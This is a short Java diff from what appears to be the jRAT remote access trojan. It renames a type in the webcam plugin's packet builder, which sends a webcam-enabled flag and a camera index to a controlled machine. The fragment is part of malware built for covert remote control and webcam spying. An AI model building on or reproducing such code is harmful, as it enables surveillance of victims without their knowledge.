@@ -4,18 +4,18 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
 import jrat.api.PacketBuilder;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 public class Packet120Webcam extends PacketBuilder {
 
 	private int webcam;
 	
-	public Packet120Webcam(RATObject rat, int webcam) {
+	public Packet120Webcam(Client rat, int webcam) {
 		super(WebcamPlugin.HEADER, rat);
 	}
 
 	@Override
-	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 		dos.writeBoolean(WebcamPlugin.enabled);
 		dos.writeInt(webcam);
 	}
